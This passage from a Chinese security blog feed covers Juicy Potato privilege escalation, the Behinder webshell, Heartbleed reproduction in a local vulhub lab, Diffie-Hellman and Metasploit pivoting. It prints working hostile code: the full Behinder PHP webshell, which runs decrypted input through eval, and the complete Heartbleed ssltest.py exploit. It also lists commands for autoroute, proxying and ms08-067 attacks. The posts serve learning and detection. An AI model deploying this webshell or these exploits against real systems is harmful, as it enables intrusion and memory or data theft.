AUTHORITY\SYSTEM</p><h2 id="02-原理"><a href="#02-原理" class="headerlink" title="02 原理"></a>02 原理</h2><p>实现过程类似于中间人攻击，通过拦截替换身份认证的数据包来完成身份认证，在创建进程时传入令牌，获取system权限，详细过程可以参考<a href="https://3gstudent.github.io/3gstudent.github.io/Windows本地提权工具Juicy-Potato测试分析/" target="_blank" rel="noopener">这篇文章</a></p><p>一些名词解释：</p><ul><li><p>COM<br>组件对象模型（Component Object Model），<a href="https://zh.wikipedia.org/wiki/组件对象模型" target="_blank" rel="noopener">维基百科</a></p></li><li><p>DCOM</p><p>分布式组件对象模型（Distributed Component Object Model），<a href="https://zh.wikipedia.org/wiki/Distributed_COM" target="_blank" rel="noopener">维基百科</a></p></li><li><p>BITS</p><p>后台智能传输服务（Background Intelligent Transfer Service），<a href="https://zh.wikipedia.org/wiki/后台智能传输服务" target="_blank" rel="noopener">维基百科</a></p></li><li><p>NTLM</p><p>问询/认证身份验证协议（NT LAN Manager），<a href="https://baike.baidu.com/item/NTLM/6371298" target="_blank" rel="noopener">百度百科</a></p></li><li><p>CLSID</p><p>类标识符（Class Identifier），<a href="https://baike.baidu.com/item/类标识符/3351394?fromtitle=clsid&fromid=2712545" target="_blank" rel="noopener">百度百科</a></p></li></ul><h2 id="03-用法"><a href="#03-用法" class="headerlink" title="03 用法"></a>03 用法</h2><ul><li>必选参数<ul><li>-t 创建进程 <ul><li>&lt;t&gt; CreateProcessWithTokenW</li><li>&lt;u&gt; CreateProcessAsUser</li><li>&lt;*&gt; 两种方法都进行尝试</li></ul></li></ul></li><li>可选参数<ul><li>-m &lt;ip&gt; 设置COM服务器监听地址，默认127.0.0.1</li><li>-a &lt;argument&gt; 要传递的参数，默认为NULL</li><li>-k &lt;ip&gt; RPC服务器IP地址，默认为127.0.0.1</li><li>-n &lt;port&gt; RPC服务器监听端口，默认为135</li><li>-c &lt;{clsid}&gt; CLSID，默认为BITS:{4991d34b-80a1-4291-83b6-3328366b9097}</li><li>-z 只测试CLSID并打印令牌的用户</li></ul></li></ul><p>作者使用示意图：</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>可以看到成功获取了system权限</p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>权限提升</tag>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>冰蝎webshell与通信方式</title>
    <link href="/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/"/>
    <url>/%E5%86%B0%E8%9D%8Ewebshell%E4%B8%8E%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>使用方法与特性简介</p><a id="more"></a><h1 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h1><h2 id="00-项目地址"><a href="#00-项目地址" class="headerlink" title="00 项目地址"></a>00 项目地址</h2><p><a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">GitHub地址</a><br>可以在此处看到作者的介绍</p><p>下面是摘抄的作者运行环境介绍和FAQ</p><ul><li><p>运行环境</p><ul><li>客户端：jre6~jre8</li><li>服务端：.net 2.0+;php 5.4-7.2;java 6+</li></ul></li><li><p>FAQ</p><ul><li><p>Mac系统下好像打不开？</p><p>Mac系统下需要通过-XstartOnFirstThread参数启动，java -XstartOnFirstThread -jar Behinder.jar。</p></li><li><p>直接用浏览器访问shell会报错？</p><p>客户端附带的服务端为最简版本，没有做容错处理，所以直接浏览器访问可能会报错，但是不影响客户端正常连接。如果不介意服务端体积增加几个字节，可以自己加一些容错判断语句。</p></li><li><p>我可以对shell进行修改么？</p><p>客户端附带的服务端可以进行各种变形，只要基本逻辑不变，客户端即可正常连接。</p></li><li><p>开了socks代理，但是服务器并没有开启代理端口？</p><p>socks代理的端口不是开在远程服务器上的，是开在本地的，利用socks客户端直接连接本地IP的代理端口即可，冰蝎会把本地端口的流量通过http隧道透传至远程服务器网络。</p></li></ul></li></ul><h2 id="01-使用"><a href="#01-使用" class="headerlink" title="01 使用"></a>01 使用</h2><p>界面如下，与同类工具相似</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>在空白处右键即可添加新连接</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><p>双击一个连接即可进行进一步操作</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><p>虚拟终端、socks代理、文件管理、反弹shell、数据库管理等</p><p>具体介绍可以看作者的<a href="https://xz.aliyun.com/t/2799" target="_blank" rel="noopener">介绍</a></p><h2 id="02-通信"><a href="#02-通信" class="headerlink" title="02 通信"></a>02 通信</h2><p>与常见的webshell相比，冰蝎的shell最大特点是对通信进行了加密<br>以PHP代码为例进行分析，PHP shell代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>@error_reporting(<span class="hljs-number">0</span>);session_start();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'pass'</span>]))&#123;    $key=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);    $_SESSION[<span class="hljs-string">'k'</span>]=$key;    <span class="hljs-keyword">print</span> $key;&#125;<span class="hljs-keyword">else</span>&#123;    $key=$_SESSION[<span class="hljs-string">'k'</span>];$post=file_get_contents(<span class="hljs-string">"php://input"</span>);<span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">'openssl'</span>))&#123;$t=<span class="hljs-string">"base64_"</span>.<span class="hljs-string">"decode"</span>;$post=$t($post.<span class="hljs-string">""</span>);<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($post);$i++) &#123;     $post[$i] = $post[$i]^$key[$i+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];     &#125;&#125;<span class="hljs-keyword">else</span>&#123;$post=openssl_decrypt($post, <span class="hljs-string">"AES128"</span>, $key);&#125;    $arr=explode(<span class="hljs-string">'|'</span>,$post);    $func=$arr[<span class="hljs-number">0</span>];    $params=$arr[<span class="hljs-number">1</span>];<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($p)</span> </span>&#123;<span class="hljs-keyword">eval</span>($p.<span class="hljs-string">""</span>);&#125;&#125;@<span class="hljs-keyword">new</span> C($params);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>通信过程：</p><ol><li><p>检测GET请求是否有?pass参数，产生随机的16位长密钥写入session，可以抓包分析密钥与PHPSESSID的对应情况<br>密钥生成方式如下，确保密钥难以计算和预测</p><pre><code class="hljs php">$key=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);</code></pre></li><li><p>检测是否开启了OpenSSL</p><ul><li>如果开启，就使用密钥进行AES加密</li><li>如果没有开启，就进行异或然后base64加密</li></ul></li></ol><p>作者所作流程图如下：</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>更详细的介绍可以看 <a href="https://xz.aliyun.com/t/2774" target="_blank" rel="noopener">这里</a></p><h2 id="03-检测"><a href="#03-检测" class="headerlink" title="03 检测"></a>03 检测</h2><p>由于冰蝎对通信过程进行了加密，一般的检测方法无法识别出其中的恶意内容，但它仍存在一些可供检测的特征</p><ol><li><p>连接开始时固定发送一个有pass参数GET请求</p></li><li><p>获取密钥时固定返回一个16位的密钥，可以用正则判断</p></li><li><p>v1.0版本中User-Agent头为JDK版本，之后的版本为在十几种常见User-Agent头中随机选取，下图来自网络</p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p></li><li><p>shell中含有加密、解密、命令执行等相关关键字，可以据此对上传的文件进行判断</p></li><li><p>对通信数据的base64编码和二进制编码进行匹配</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>心脏滴血漏洞简介 CVE-2014-0160</title>
    <link href="/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-CVE-2014-0160/"/>
    <url>/%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-CVE-2014-0160/</url>
    
    <content type="html"><![CDATA[<p>原理简介与vulnhub复现</p><a id="more"></a><h1 id="心脏滴血漏洞简介-CVE-2014-0160"><a href="#心脏滴血漏洞简介-CVE-2014-0160" class="headerlink" title="心脏滴血漏洞简介 CVE-2014-0160"></a>心脏滴血漏洞简介 CVE-2014-0160</h1><h2 id="00-漏洞原理"><a href="#00-漏洞原理" class="headerlink" title="00 漏洞原理"></a>00 漏洞原理</h2><p>此漏洞之所以称为心脏滴血，是因为漏洞发生在OpenSSL的心跳包中</p><p>心跳包用于确定连接双方没有断开连接，连接一方每隔一段时间就发送一个心跳包，另一方收到之后之后返回少量数据（64KB），说明连接没有断开，由于每隔一段时间就进行一次连接存活确认，如同心跳一样，因此称为心跳包</p><p>在心跳包中，有用于确定返回数据长度的参数，另一方收到心跳包后就将根据这一参数返回一个相同长度的数据包，代码如下：</p><pre><code class="hljs armasm"><span class="hljs-symbol">memcpy</span>(<span class="hljs-keyword">str1, </span><span class="hljs-keyword">str2, </span>len)<span class="hljs-comment">;</span></code></pre><p>由于没有对这一长度参数进行边界检查，如果要复制的字节长度大于实际长度，就会继续复制内存中的其他数据，导致可以返回64KB之外的数据，造成了信息泄露</p><h2 id="01-影响范围"><a href="#01-影响范围" class="headerlink" title="01 影响范围"></a>01 影响范围</h2><p>版本：</p><ul><li>OpenSSL 1.0.2-beta</li><li>OpenSSL 1.0.1 - OpenSSL 1.0.1f</li></ul><p>修复方法：</p><ul><li>升级OpenSSL</li><li>重启相关服务</li></ul><h2 id="02-vulnhub复现"><a href="#02-vulnhub复现" class="headerlink" title="02 vulnhub复现"></a>02 vulnhub复现</h2><p>安装vulnhub之后，进入heartbleed目录中，完整路径如下</p><pre><code class="hljs shell">/vulhub/openssl/heartbleed</code></pre><p>使用docker启动实验环境</p><pre><code class="hljs shell">docker-compose builddocker-compose up -d</code></pre><p>启动成功</p><p>实验结束后使用 docker-compose down 终止环境</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>如果出现80端口已被使用的错误，可能是已经启动了Apache，可以关闭Apache后重试</p><p>访问本地回环地址127.0.0.1即可看到测试环境</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><h2 id="03-使用ssltest-py进行检测"><a href="#03-使用ssltest-py进行检测" class="headerlink" title="03 使用ssltest.py进行检测"></a>03 使用ssltest.py进行检测</h2><p>在heartbleed文件夹中包含一个ssltest.py文件，代码如下：</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-comment"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span><span class="hljs-comment"># The author disclaims copyright to this source code.</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> select<span class="hljs-keyword">import</span> re<span class="hljs-keyword">from</span> optparse <span class="hljs-keyword">import</span> OptionParseroptions = OptionParser(usage=<span class="hljs-string">'%prog server [options]'</span>, description=<span class="hljs-string">'Test for SSL heartbeat vulnerability (CVE-2014-0160)'</span>)options.add_option(<span class="hljs-string">'-p'</span>, <span class="hljs-string">'--port'</span>, type=<span class="hljs-string">'int'</span>, default=<span class="hljs-number">443</span>, help=<span class="hljs-string">'TCP port to test (default: 443)'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">h2bin</span><span class="hljs-params">(x)</span>:</span>    <span class="hljs-keyword">return</span> x.replace(<span class="hljs-string">' '</span>, <span class="hljs-string">''</span>).replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>).decode(<span class="hljs-string">'hex'</span>)hello = h2bin(<span class="hljs-string">'''</span><span class="hljs-string">16 03 02 00  dc 01 00 00 d8 03 02 53</span><span class="hljs-string">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span><span class="hljs-string">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span><span class="hljs-string">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span><span class="hljs-string">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span><span class="hljs-string">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span><span class="hljs-string">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span><span class="hljs-string">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span><span class="hljs-string">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span><span class="hljs-string">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span><span class="hljs-string">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span><span class="hljs-string">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span><span class="hljs-string">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span><span class="hljs-string">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span><span class="hljs-string">00 0f 00 01 01</span><span class="hljs-string">'''</span>)hb = h2bin(<span class="hljs-string">'''</span><span class="hljs-string">18 03 02 00 03</span><span class="hljs-string">01 40 00</span><span class="hljs-string">'''</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hexdump</span><span class="hljs-params">(s)</span>:</span>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, len(s), <span class="hljs-number">16</span>):        lin = [c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s[b : b + <span class="hljs-number">16</span>]]        hxdat = <span class="hljs-string">' '</span>.join(<span class="hljs-string">'%02X'</span> % ord(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> lin)        pdat = <span class="hljs-string">''</span>.join((c <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= ord(c) &lt;= <span class="hljs-number">126</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'.'</span> )<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> lin)        <span class="hljs-keyword">print</span> <span class="hljs-string">'  %04x: %-48s %s'</span> % (b, hxdat, pdat)    <span class="hljs-keyword">print</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recvall</span><span class="hljs-params">(s, length, timeout=<span class="hljs-number">5</span>)</span>:</span>    endtime = time.time() + timeout    rdata = <span class="hljs-string">''</span>    remain = length    <span class="hljs-keyword">while</span> remain &gt; <span class="hljs-number">0</span>:        rtime = endtime - time.time()        <span class="hljs-keyword">if</span> rtime &lt; <span class="hljs-number">0</span>:            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>        r, w, e = select.select([s], [], [], <span class="hljs-number">5</span>)        <span class="hljs-keyword">if</span> s <span class="hljs-keyword">in</span> r:            data = s.recv(remain)            <span class="hljs-comment"># EOF?</span>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>            rdata += data            remain -= len(data)    <span class="hljs-keyword">return</span> rdata<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recvmsg</span><span class="hljs-params">(s)</span>:</span>    hdr = recvall(s, <span class="hljs-number">5</span>)    <span class="hljs-keyword">if</span> hdr <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:        <span class="hljs-keyword">print</span> <span class="hljs-string">'Unexpected EOF receiving record header - server closed connection'</span>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>    typ, ver, ln = struct.unpack(<span class="hljs-string">'&gt;BHH'</span>, hdr)    pay = recvall(s, ln, <span class="hljs-number">10</span>)    <span class="hljs-keyword">if</span> pay <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:        <span class="hljs-keyword">print</span> <span class="hljs-string">'Unexpected EOF receiving record payload - server closed connection'</span>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>    <span class="hljs-keyword">print</span> <span class="hljs-string">' ... received message: type = %d, ver = %04x, length = %d'</span> % (typ, ver, len(pay))    <span class="hljs-keyword">return</span> typ, ver, pay<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hit_hb</span><span class="hljs-params">(s)</span>:</span>    s.send(hb)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        typ, ver, pay = recvmsg(s)        <span class="hljs-keyword">if</span> typ <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:            <span class="hljs-keyword">print</span> <span class="hljs-string">'No heartbeat response received, server likely not vulnerable'</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>        <span class="hljs-keyword">if</span> typ == <span class="hljs-number">24</span>:            <span class="hljs-keyword">print</span> <span class="hljs-string">'Received heartbeat response:'</span>            hexdump(pay)            <span class="hljs-keyword">if</span> len(pay) &gt; <span class="hljs-number">3</span>:                <span class="hljs-keyword">print</span> <span class="hljs-string">'WARNING: server returned more data than it should - server is vulnerable!'</span>            <span class="hljs-keyword">else</span>:                <span class="hljs-keyword">print</span> <span class="hljs-string">'Server processed malformed heartbeat, but did not return any extra data.'</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>        <span class="hljs-keyword">if</span> typ == <span class="hljs-number">21</span>:            <span class="hljs-keyword">print</span> <span class="hljs-string">'Received alert:'</span>            hexdump(pay)            <span class="hljs-keyword">print</span> <span class="hljs-string">'Server returned error, likely not vulnerable'</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    opts, args = options.parse_args()    <span class="hljs-keyword">if</span> len(args) &lt; <span class="hljs-number">1</span>:        options.print_help()        <span class="hljs-keyword">return</span>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    <span class="hljs-keyword">print</span> <span class="hljs-string">'Connecting...'</span>    sys.stdout.flush()    s.connect((args[<span class="hljs-number">0</span>], opts.port))    <span class="hljs-keyword">print</span> <span class="hljs-string">'Sending Client Hello...'</span>    sys.stdout.flush()    s.send(hello)    <span class="hljs-keyword">print</span> <span class="hljs-string">'Waiting for Server Hello...'</span>    sys.stdout.flush()    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        typ, ver, pay = recvmsg(s)        <span class="hljs-keyword">if</span> typ == <span class="hljs-literal">None</span>:            <span class="hljs-keyword">print</span> <span class="hljs-string">'Server closed connection without sending Server Hello.'</span>            <span class="hljs-keyword">return</span>        <span class="hljs-comment"># Look for server hello done message.</span>        <span class="hljs-keyword">if</span> typ == <span class="hljs-number">22</span> <span class="hljs-keyword">and</span> ord(pay[<span class="hljs-number">0</span>]) == <span class="hljs-number">0x0E</span>:            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">print</span> <span class="hljs-string">'Sending heartbeat request...'</span>    sys.stdout.flush()    s.send(hb)    hit_hb(s)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    main()%</code></pre><p>运行脚本</p><pre><code class="hljs shell">python ssltest.py 127.0.0.1 [-p 443]</code></pre><p>可以使用p参数指定端口，默认端口为443</p><p>运行结果如下</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>返回了多于它本应返回的数据，说明存在漏洞</p><h2 id="04-使用nmap进行探测"><a href="#04-使用nmap进行探测" class="headerlink" title="04 使用nmap进行探测"></a>04 使用nmap进行探测</h2><p>命令如下</p><pre><code class="hljs shell">nmap 127.0.0.1 -p 443 -sV --script ssl-heartbleed.nse</code></pre><ul><li><p>-p 指定443端口</p></li><li><p>-sV 探测服务版本</p></li><li><p>–script ssl-heartbleed.nse 使用心脏滴血探测脚本</p></li></ul><p>结果如下：</p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p><p>可见状态为vulnerable，即为存在漏洞，风险为高</p><h2 id="04-使用msf进行探测"><a href="#04-使用msf进行探测" class="headerlink" title="04 使用msf进行探测"></a>04 使用msf进行探测</h2><p>命令行msfconsole启动msf，之后搜索心脏滴血相关exploits</p><p><img src="6.png" srcset="/img/loading.gif" alt=""></p><p>使用#0可以进行探测，选择后查看选项</p><p><img src="7.png" srcset="/img/loading.gif" alt=""></p><p>RPORT默认为443，需要我们设置的只有RHOSTS参数，设置之后即可运行<br>另外设置verbose为true可以显示详细结果</p><p><img src="8.png" srcset="/img/loading.gif" alt=""></p><p>使用exploit或run命令执行，即可看到详细结果</p><h2 id="05-使用在线工具检测"><a href="#05-使用在线工具检测" class="headerlink" title="05 使用在线工具检测"></a>05 使用在线工具检测</h2><p>网上有许多在线工具或其他工具可以进行检测，这里不再详细说明</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>vulhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Diffie-Hellman密钥交换算法</title>
    <link href="/Diffie-Hellman%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E7%AE%97%E6%B3%95/"/>
    <url>/Diffie-Hellman%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>DH密钥交换的实现过程</p><a id="more"></a><h1 id="Diffie-Hellman密钥交换算法"><a href="#Diffie-Hellman密钥交换算法" class="headerlink" title="Diffie-Hellman密钥交换算法"></a>Diffie-Hellman密钥交换算法</h1><h2 id="01-简介"><a href="#01-简介" class="headerlink" title="01 简介"></a>01 简介</h2><p>迪菲赫尔曼密钥交换（Diffie-Hellman Key Exchange，简称DH），是一种可以使双方在不安全的信道上安全地获得一个共同密钥的算法，这个密钥可以在后续的通讯中作为对称密钥进行加密通信</p><h2 id="02-实现过程"><a href="#02-实现过程" class="headerlink" title="02 实现过程"></a>02 实现过程</h2><p>假设Alice与Bob使用DH算法交换密钥，实现过程如下:</p><ul><li>选取一个公开的大素数p和一个生成元g（2 ≤ g ≤ p-2），p和g均公开</li><li>Alice选取一个随机数a（1 ≤ a ≤ p-2 ），a保密</li><li>Alice计算A=g^a (mod p)，将A发送给Bob，A公开</li><li>Bob选取一个随机数b（1 ≤ b ≤ p-2 ），b保密</li><li>Bob计算B=g^b (mod p)，将B发送给Alice，B公开</li><li>Alice收到B后计算S=B^a(mod p)=g^ba(mod p)，S保密</li><li>Bob收到A后计算S=A^b(mod p)=g^ab(mod p)，S保密</li><li>经过这一个交换过程，双方获得了相同的密钥S</li></ul><p>各数据保密与公开情况：</p><ul><li>公开：p，g，A，B</li><li>保密：a，b，S</li></ul><h2 id="03-安全性"><a href="#03-安全性" class="headerlink" title="03 安全性"></a>03 安全性</h2><ol><li><p><strong>窃听者</strong><br>假设存在一个窃听者Eve，他可以获得全部信息是p，g，A，B</p><p>如果Eve想要计算出S的值，就需要知取离散对数，而当p很大时，计算是非常困难的，在使用时，p可以取一个至少300位的素数，a和b都至少有100位，但是g的值不需要很大，一般取2或5</p><p>因此，DH的安全性来自于离散对数的计算难度，如果出现了一个高效的解决离散对数的算法，包括DH在内的很多算法都将变得不安全</p></li><li><p><strong>中间人攻击</strong></p><p>由于DH算法不验证收发信息的双方身份，因此容易遭受中间人攻击</p><p>假设存在中间人Eve获取了公开的p和g的值，他的中间人攻击过程如下：</p><ul><li>Eve选择随机数e，计算E=g^e(mod p)</li><li>Eve拦截Alice发送的A，并将E发送给Alice</li><li>Eve拦截Bob发送的B，并将E发送给Bob</li><li>Eve计算Ea=A^e(mod p)=g^ae(mod p)</li><li>Eve计算Eb=B^e(mod p)=g^be(mod p)</li><li>Alice计算Sa=E^a(mod p)=g^ea(mod p)=Ea</li><li>Bob计算Sb=E^b(mod p)=g^eb(mod p)=Eb</li><li>由此Eve分别于Alice和Bob获得了相同的密钥</li></ul><p>因此为了改进安全性，DH需要增加对双方身份的验证</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用MSF进行内网渗透</title>
    <link href="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<p>内网的跳板攻击与代理设置</p><a id="more"></a><h1 id="使用MSF进行内网渗透"><a href="#使用MSF进行内网渗透" class="headerlink" title="使用MSF进行内网渗透"></a>使用MSF进行内网渗透</h1><p>网络示意图</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><h2 id="01-使用msf获取shell"><a href="#01-使用msf获取shell" class="headerlink" title="01 使用msf获取shell"></a>01 使用msf获取shell</h2><p>生成后门程序，注意反弹IP要是公网IP，注意目标32位还是64位</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><p>设置payload，然后exploit</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><p>当前状态：攻击者（192.168.101.168）使用meterpreter与web服务器（192.168.31.164）获得了通信，但还无法访问内网（192.168.103.*）</p><h2 id="02-跳板攻击与自动路由"><a href="#02-跳板攻击与自动路由" class="headerlink" title="02 跳板攻击与自动路由"></a>02 跳板攻击与自动路由</h2><ul><li>Pivoting<ul><li>利用已经被入侵的主机作为跳板来攻击网络中的其他系统</li><li>访问由于路由问题而不能直接访问的内网系统</li></ul></li><li>自动路由<ul><li>Run autoroute -s 192.168.103.0/24</li><li>Run post/multi/manage/autoroute</li><li>扫描内网网络<ul><li>Run post/windows/gather/arp_scanner rhosts=192.168.103.0/24</li><li>use auxiliary/scanner/portscan/tcp</li></ul></li></ul></li></ul><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><p>添加自动路由</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>使用-p查看路由表，成功获得了跳板</p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p><p>有了跳板之后，可以对内网进行扫描</p><p><img src="6.png" srcset="/img/loading.gif" alt=""></p><p>TCP端口扫描</p><p><img src="7.png" srcset="/img/loading.gif" alt=""></p><h2 id="03-设置代理"><a href="#03-设置代理" class="headerlink" title="03 设置代理"></a>03 设置代理</h2><p>要想使用msf之外的工具，需要设置代理</p><ul><li>Socket代理<ul><li>auxiliary/server/socks4a</li></ul></li><li>ProxyChains<ul><li>任何TCP连接都可以通过TOR或者SOCKS4，SOCKS5，HTTP/HTTPS到达目的地，在这个通道技术中可以使用多个代理服务器，除此之外还提供匿名网络</li></ul></li></ul><h3 id="操作过程-1"><a href="#操作过程-1" class="headerlink" title="操作过程"></a>操作过程</h3><p>使用socket代理，配置选项</p><p><img src="8.png" srcset="/img/loading.gif" alt=""></p><p>开启代理</p><p><img src="9.png" srcset="/img/loading.gif" alt=""></p><p>配置proxychains</p><p><img src="10.png" srcset="/img/loading.gif" alt=""></p><p>在末尾添加上使用的socks4代理</p><p><img src="12.png" srcset="/img/loading.gif" alt=""></p><p>配置好之后即可使用nmap对内网进行扫描，查看是否存在ms08-067漏洞</p><p><img src="13.png" srcset="/img/loading.gif" alt=""></p><p>使用msf进行攻击</p><p><img src="14.png" srcset="/img/loading.gif" alt=""></p><p>注意payload要使用直连而非反弹shell，因为路由是单向的，靶机无法访问到攻击者主机</p><p><img src="15.png" srcset="/img/loading.gif" alt=""></p><p><img src="16.png" srcset="/img/loading.gif" alt=""></p><p>对内网攻击时，都是通过跳板，显示的攻击者IP是跳板机的IP</p><h3 id="多级内网的情况"><a href="#多级内网的情况" class="headerlink" title="多级内网的情况"></a>多级内网的情况</h3><p>存在多级内网时，需要再次添加代理</p><p>设置代理</p><p><img src="17.png" srcset="/img/loading.gif" alt=""></p><p>再添加一个端口</p><p><img src="18.png" srcset="/img/loading.gif" alt=""></p><p><img src="19.png" srcset="/img/loading.gif" alt=""></p><p>设置proxychains</p><p><img src="20.png" srcset="/img/loading.gif" alt=""></p><p><img src="21.png" srcset="/img/loading.gif" alt=""></p><p>之后就可以使用nmap进行扫描</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>渗透测试</tag>
      
      <tag>MSF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSF和NC永久后门植入</title>
    <link href="/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/"/>
    <url>/MSF%E5%92%8CNC%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/</url>
    
